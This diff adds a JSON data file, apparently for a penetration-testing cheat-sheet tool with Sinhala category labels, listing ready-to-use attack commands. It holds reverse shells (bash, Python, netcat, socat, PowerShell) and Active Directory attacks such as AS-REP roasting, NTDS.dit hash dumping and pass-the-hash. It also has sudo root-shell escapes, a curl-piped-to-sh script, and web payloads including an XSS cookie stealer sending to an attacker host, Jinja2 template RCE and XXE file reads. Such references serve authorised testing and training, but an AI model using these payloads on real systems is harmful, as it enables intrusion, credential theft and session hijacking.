@@ -1,0 +1,131 @@
+[
+  {
+    "category": "Reverse Shells",
+    "category_si": "Reverse Shell විධාන",
+    "items": [
+      {
+        "title": "Bash Interactive TCP",
+        "cmd": "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1",
+        "desc": "Standard Linux bash reverse shell using /dev/tcp pseudo-device."
+      },
+      {
+        "title": "Python 3 PTY Shell",
+        "cmd": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<LHOST>\",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'",
+        "desc": "Spawns a full interactive PTY bash shell directly using Python 3."
+      },
+      {
+        "title": "Netcat with -e",
+        "cmd": "nc -e /bin/bash <LHOST> <LPORT>",
+        "desc": "Traditional netcat reverse shell when compiled with GAPING_SECURITY_HOLE (-e support)."
+      },
+      {
+        "title": "Netcat FIFO Pipe (OpenBSD Netcat)",
+        "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f",
+        "desc": "Works on Ubuntu/Debian netcat-openbsd where -e flag is disabled."
+      },
+      {
+        "title": "Socat Encrypted Reverse Shell",
+        "cmd": "socat OPENSSL-CONNECT:<LHOST>:<LPORT>,verify=0 EXEC:/bin/bash",
+        "desc": "Full encrypted PTY reverse shell via OpenSSL and Socat."
+      },
+      {
+        "title": "PowerShell Reverse Shell",
+        "cmd": "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
+        "desc": "Pure PowerShell one-liner reverse TCP shell on Windows."
+      }
+    ]
+  },
+  {
+    "category": "Active Directory Attacks",
+    "category_si": "Active Directory ප්‍රහාරක විධාන",
+    "items": [
+      {
+        "title": "AS-REP Roasting (Impacket)",
+        "cmd": "impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip <DC_IP>",
+        "desc": "Harvests AS-REP Kerberos hashes for accounts without Kerberos pre-authentication enabled."
+      },
+      {
+        "title": "AS-REP Hash Cracking (Hashcat)",
+        "cmd": "hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -O",
+        "desc": "Optimized GPU cracking of Kerberos 5 AS-REP etype 23 hashes."
+      },
+      {
+        "title": "BloodHound Python Ingestion",
+        "cmd": "bloodhound-python -u <USER> -p <PASSWORD> -d <DOMAIN> -dc <DC_HOST> -c All -ns <DC_IP>",
+        "desc": "Gathers users, groups, ACLs, sessions, and domain trusts for BloodHound graph analysis."
+      },
+      {
+        "title": "Dump NTDS.dit Secrets (Impacket)",
+        "cmd": "impacket-secretsdump <DOMAIN>/<ADMIN>:'<PASSWORD>'@<DC_IP> -just-dc-ntlm",
+        "desc": "Dumps all domain user NTLM hashes directly from the Active Directory NTDS.dit database."
+      },
+      {
+        "title": "Pass-the-Hash with PsExec",
+        "cmd": "impacket-psexec -hashes :<NTLM_HASH> <DOMAIN>/<USER>@<TARGET_IP>",
+        "desc": "Spawns an interactive SYSTEM shell using an NTLM hash without knowing the plaintext password."
+      }
+    ]
+  },
+  {
+    "category": "Linux Privilege Escalation",
+    "category_si": "Linux Privilege Escalation (Sudo & SUID)",
+    "items": [
+      {
+        "title": "Check Current Sudo Rights",
+        "cmd": "sudo -l",
+        "desc": "Lists the commands the current user can execute via sudo."
+      },
+      {
+        "title": "Sudo Nano Shell Escape",
+        "cmd": "sudo nano\n^R^X\nreset; sh 1>&0 2>&0",
+        "desc": "Escapes to root shell from inside GNU Nano editor run with sudo privileges."
+      },
+      {
+        "title": "Sudo Find Shell Escape",
+        "cmd": "sudo find . -exec /bin/sh \\; -quit",
+        "desc": "Spawns a root shell via find's -exec flag when permitted under sudo."
+      },
+      {
+        "title": "Find All SUID Binaries",
+        "cmd": "find / -perm -4000 -type f -exec ls -la {} + 2>/dev/null",
+        "desc": "Enumerates all executable binaries on the system having the SUID bit set."
+      },
+      {
+        "title": "Automated Enumeration via LinPEAS",
+        "cmd": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
+        "desc": "Executes LinPEAS memory-resident audit script searching for privesc vectors."
+      }
+    ]
+  },
+  {
+    "category": "Web Security Payloads",
+    "category_si": "Web Application Payloads (SQLi & XSS)",
+    "items": [
+      {
+        "title": "SQLi Authentication Bypass",
+        "cmd": "admin' OR '1'='1'-- -",
+        "desc": "Universal SQL injection authentication bypass payload."
+      },
+      {
+        "title": "SQLi Union Column Enumeration",
+        "cmd": "' UNION SELECT NULL, NULL, NULL, group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- -",
+        "desc": "Dumps all table names from current MySQL database using Union-Based SQLi."
+      },
+      {
+        "title": "XSS Cookie Stealer",
+        "cmd": "<script>fetch('http://<ATTACKER_IP>:9001/?c=' + encodeURIComponent(document.cookie));</script>",
+        "desc": "Transmits victim session cookies to an external attacker listener."
+      },
+      {
+        "title": "SSTI Jinja2 Remote Code Execution",
+        "cmd": "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}",
+        "desc": "Executes arbitrary system commands on Python Flask / Jinja2 template engines."
+      },
+      {
+        "title": "XXE Sensitive File Read",
+        "cmd": "<!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><data>&xxe;</data>",
+        "desc": "Standard XML External Entity payload to retrieve local server files."
+      }
+    ]
+  }
+]
